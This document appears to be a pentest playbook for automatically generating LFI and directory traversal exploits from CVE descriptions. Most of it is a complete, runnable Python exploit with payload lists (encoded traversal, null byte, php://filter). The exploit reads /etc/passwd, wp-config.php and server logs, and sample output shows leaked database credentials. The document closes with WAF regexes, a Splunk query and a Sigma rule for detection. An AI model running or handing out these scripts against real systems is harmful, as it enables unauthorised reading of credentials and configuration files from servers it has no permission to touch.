# File Read / LFI Exploit Generation

## Overview
- **Purpose**: Automatically generate Python exploit scripts for Local File Inclusion (LFI) and directory traversal vulnerabilities from CVE data
- **Category**: exploitation
- **Severity**: high
- **Tags**: lfi, local-file-inclusion, directory-traversal, path-traversal, file-read, exploit-generation, cve, T1005, T1083

## Context and Use-Cases
- Generate working LFI/directory traversal exploits from CVE descriptions
- Test multiple encoding and bypass techniques automatically
- Target sensitive files across Linux and Windows systems
- Useful for penetration testing, vulnerability validation, and security research
- Demonstrate impact through configuration file disclosure and credential exposure

## Key Parameters and Inputs
- **cve_data** (dict, required): CVE information including `cve_id`, `description`. Example: `{"cve_id": "CVE-2024-9012", "description": "Directory traversal via portal_type parameter"}`
- **target_info** (dict, required): Target configuration. Example: `{"target_url": "http://target.com/view"}`
- **details** (dict, required): Extracted vulnerability details including `parameters` (list), `traversal_type` (string). Example: `{"parameters": ["file"], "traversal_type": "lfi"}`

## Procedure
1. Parse CVE description to extract vulnerable parameter name using regex
2. Determine traversal type (directory traversal, LFI, file read)
3. Generate Python exploit class with session management
4. Create `generate_payloads()` method with multiple techniques:
   - Basic traversal sequences (../, ..\\)
   - URL encoding (%2e%2e%2f)
   - Double encoding
   - Null byte injection (%00)
   - Absolute paths
   - PHP wrappers (php://filter)
   - Windows paths (C:\\)
5. Implement `test_file_read()` method testing common sensitive files
6. Implement `read_specific_file()` method for targeted file extraction
7. Add command-line interface accepting target URL, parameter, and optional file path
8. Return complete exploit script with usage instructions

## Examples

### Generated Exploit Script Structure
```python
#!/usr/bin/env python3
# Local File Inclusion (LFI) Exploit for CVE-2024-9012
# Vulnerability: Directory traversal via portal_type parameter
# Parameter: portal_type
# Type: lfi

import requests
import sys
from urllib.parse import quote

class FileReadExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()

    def generate_payloads(self, target_file="/etc/passwd"):
        """Generate directory traversal payloads"""
        payloads = [
            # Basic traversal
            "../" * 10 + target_file.lstrip('/'),
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            
            # URL encoded
            quote("../") * 10 + target_file.lstrip('/'),
            
            # Double encoding
            quote(quote("../")) * 10 + target_file.lstrip('/'),
            
            # Null byte (for older systems)
            "../" * 10 + target_file.lstrip('/') + "%00.txt",
            
            # Absolute paths
            target_file,
            "file://" + target_file,
            
            # Windows paths
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "C:/windows/system32/drivers/etc/hosts"
        ]
        
        return payloads

    def test_file_read(self, parameter="portal_type"):
        """Test LFI vulnerability on WordPress"""
        print(f"[+] Testing LFI on parameter: {parameter}")
        
        # WordPress-specific files and common targets
        test_files = [
            "/etc/passwd",
            "/etc/hosts", 
            "/proc/version",
            "/var/www/html/wp-config.php",
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
            "../../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=wp-config.php"
        ]
        
        for target_file in test_files:
            payloads = self.generate_payloads(target_file)
            
            for i, payload in enumerate(payloads):
                try:
                    response = self.session.get(
                        self.target_url,
                        params={parameter: payload}
                    )
                    
                    # Check for common file contents
                    indicators = [
                        "root:", "daemon:", "bin:", "sys:",  # /etc/passwd
                        "localhost", "127.0.0.1",  # hosts file
                        "Linux version", "Microsoft Windows",  # system info
                        "<?php", "#!/bin/"  # code files
                    ]
                    
                    if any(indicator in response.text for indicator in indicators):
                        print(f"[+] File read successful!")
                        print(f"[+] File: {target_file}")
                        print(f"[+] Payload: {payload}")
                        print(f"[+] Content preview: {response.text[:200]}...")
                        return True
                
                except Exception as e:
                    continue
        
        return False

    def read_specific_file(self, filepath, parameter="file"):
        """Read a specific file"""
        print(f"[+] Attempting to read: {filepath}")
        
        payloads = self.generate_payloads(filepath)
        
        for payload in payloads:
            try:
                response = self.session.get(
                    self.target_url,
                    params={parameter: payload}
                )
                
                if response.status_code == 200 and len(response.text) > 10:
                    print(f"[+] Successfully read {filepath}:")
                    print("-" * 50)
                    print(response.text)
                    print("-" * 50)
                    return response.text
            
            except Exception as e:
                continue
        
        print(f"[-] Could not read {filepath}")
        return None

def main():
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_url> [parameter] [file_to_read]")
        print(f"Example: python3 {sys.argv[0]} http://target.com/view file /etc/passwd")
        sys.exit(1)
    
    target_url = sys.argv[1]
    parameter = sys.argv[2] if len(sys.argv) > 2 else "file"
    specific_file = sys.argv[3] if len(sys.argv) > 3 else None
    
    exploit = FileReadExploit(target_url)
    
    print(f"[+] File Read Exploit for CVE-2024-9012")
    print(f"[+] Target: {target_url}")
    
    if specific_file:
        exploit.read_specific_file(specific_file, parameter)
    else:
        if exploit.test_file_read(parameter):
            print("[+] File read vulnerability confirmed!")
        else:
            print("[-] No file read vulnerability found")

if __name__ == "__main__":
    main()
```

### Usage Examples

**Automated Testing**
```bash
python3 lfi_exploit.py http://target.com/view portal_type

# Output:
# [+] File Read Exploit for CVE-2024-9012
# [+] Target: http://target.com/view
# [+] Testing LFI on parameter: portal_type
# [+] File read successful!
# [+] File: /etc/passwd
# [+] Payload: ../../../../../../../../etc/passwd
# [+] Content preview: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin...
```

**Read Specific File**
```bash
python3 lfi_exploit.py http://target.com/view file /var/www/html/wp-config.php

# Output:
# [+] Attempting to read: /var/www/html/wp-config.php
# [+] Successfully read /var/www/html/wp-config.php:
# --------------------------------------------------
# <?php
# define('DB_NAME', 'wordpress');
# define('DB_USER', 'wp_user');
# define('DB_PASSWORD', 'secret_password_123');
# --------------------------------------------------
```

**PHP Filter Wrapper**
```bash
# Using PHP filter to base64-encode file content (bypass some filters)
python3 lfi_exploit.py http://target.com/view file "php://filter/convert.base64-encode/resource=index.php"
```

## Indicators / Detection

### Log Sources
- Web server access logs (Apache, Nginx, IIS)
- Web Application Firewall (WAF) logs
- File integrity monitoring (FIM) systems
- Intrusion Detection System (IDS) alerts

### Detection Patterns

**WAF/IDS Rules (Regex)**
```regex
# Path traversal sequences
(\.\./|\.\\.\\|%2e%2e%2f|%2e%2e%5c|%252e%252e%252f)

# Sensitive file access
(\/etc\/(passwd|shadow|hosts|group)|wp-config\.php|web\.config|\.htaccess)

# PHP wrappers
(php:\/\/|file:\/\/|expect:\/\/|data:\/\/|zip:\/\/)

# Null byte injection
(%00|\\x00)
```

**Splunk Query**
```spl
index=web_logs 
| regex _raw="(?i)(\.\.\/|\.\.\\\\|%2e%2e|php:\/\/|file:\/\/|\/etc\/passwd|wp-config)"
| stats count by src_ip, uri, query_string
| where count > 3
| table _time, src_ip, uri, query_string, count
```

**Sigma Rule**
```yaml
title: LFI and Path Traversal Attack
logsource:
  category: webserver
detection:
  selection_traversal:
    cs-uri-query|contains:
      - '../'
      - '..\'
      - '%2e%2e'
      - '%252e'
  selection_files:
    cs-uri-query|contains:
      - '/etc/passwd'
      - '/etc/shadow'
      - 'wp-config.php'
      - 'web.config'
  selection_wrappers:
    cs-uri-query|contains:
      - 'php://'
      - 'file://'
      - 'expect://'
  condition: 1 of selection_*
```


## Limitations and Caveats

- **Content Detection**: Relies on simple string indicators (root:, <?php); may miss files with unexpected formats
- **Path Knowledge**: Requires knowledge of target file paths and system type (Linux vs Windows)
- **Custom Resolvers**: May not work with applications using custom file path resolution logic
- **Null Byte Limitation**: Only effective on PHP < 5.3.4 and other legacy systems
- **Encoding Depth**: Double encoding may not bypass all filters; some WAFs detect multiple encoding layers
- **False Negatives**: Files may exist but not be readable due to permissions
- **WordPress-Specific**: Example includes WordPress paths; requires customization for other applications
- **Base64 Detection**: PHP filter wrapper outputs base64; requires decoding to verify content
- **IDS Alerts**: Aggressive testing with multiple payloads may trigger alerts and IP blocking

## Source Excerpts

### [S1] File Read Vulnerability Detection
```python
# From exploit_template.py lines 322-337
# File read/traversal detection
elif any(keyword in description_lower for keyword in
         ["file read", "directory traversal", "path traversal", "arbitrary file", "file disclosure",
          "local file inclusion", "lfi", "file inclusion"]):
    vuln_type = "file_read"
    if "directory traversal" in description_lower or "path traversal" in description_lower:
        specific_details["traversal_type"] = "directory"
    elif "local file inclusion" in description_lower or "lfi" in description_lower:
        specific_details["traversal_type"] = "lfi"
    else:
        specific_details["traversal_type"] = "file_read"
    
    # Extract parameter names for LFI
    param_matches = re.findall(r'(?:via|parameter|param)\s+([a-zA-Z_][a-zA-Z0-9_]*)', description)
    if param_matches:
        specific_details["parameters"] = param_matches
```

### [S2] Payload Generation with Multiple Techniques
```python
# From exploit_template.py lines 633-658
def generate_payloads(self, target_file="/etc/passwd"):
    """Generate directory traversal payloads"""
    payloads = [
        # Basic traversal
        "../" * 10 + target_file.lstrip('/'),
        "..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
        
        # URL encoded
        quote("../") * 10 + target_file.lstrip('/'),
        
        # Double encoding
        quote(quote("../")) * 10 + target_file.lstrip('/'),
        
        # Null byte (for older systems)
        "../" * 10 + target_file.lstrip('/') + "%00.txt",
        
        # Absolute paths
        target_file,
        "file://" + target_file,
        
        # Windows paths
        "C:\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
        "C:/windows/system32/drivers/etc/hosts"
    ]
    
    return payloads
```

### [S3] File Content Detection and Verification
```python
# From exploit_template.py lines 660-704
def test_file_read(self, parameter="{parameter}"):
    """Test LFI vulnerability on WordPress"""
    print(f"[+] Testing LFI on parameter: {{parameter}}")
    
    # WordPress-specific files and common targets
    test_files = [
        "/etc/passwd",
        "/etc/hosts", 
        "/proc/version",
        "/var/www/html/wp-config.php",
        "/var/log/apache2/access.log",
        "/var/log/nginx/access.log",
        "../../../../etc/passwd",
        "php://filter/convert.base64-encode/resource=wp-config.php"
    ]
    
    for target_file in test_files:
        payloads = self.generate_payloads(target_file)
        
        for i, payload in enumerate(payloads):
            try:
                response = self.session.get(
                    self.target_url,
                    params={{parameter: payload}}
                )
                
                # Check for common file contents
                indicators = [
                    "root:", "daemon:", "bin:", "sys:",  # /etc/passwd
                    "localhost", "127.0.0.1",  # hosts file
                    "Linux version", "Microsoft Windows",  # system info
                    "<?php", "#!/bin/"  # code files
                ]
                
                if any(indicator in response.text for indicator in indicators):
                    print(f"[+] File read successful!")
                    print(f"[+] File: {{target_file}}")
                    print(f"[+] Payload: {{payload}}")
                    print(f"[+] Content preview: {{response.text[:200]}}...")
                    return True
            
            except Exception as e:
                continue
    
    return False
```

